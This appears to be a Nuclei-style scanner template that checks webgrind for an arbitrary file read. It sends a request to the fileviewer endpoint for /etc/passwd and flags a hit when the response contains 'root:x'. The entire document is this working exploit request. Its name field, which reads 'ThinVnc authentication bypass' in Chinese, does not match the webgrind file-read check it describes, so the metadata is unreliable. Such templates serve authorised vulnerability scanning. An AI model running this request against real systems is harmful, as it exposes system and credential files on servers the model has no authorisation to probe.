id: webgrind-fileRead
info:
  author: Str1am
  name: "ThinVnc-\u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7"
  severity: medium
  tags: webgrind,fileRead
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/webgrind/index.php?op=fileviewer&file=/etc/passwd'
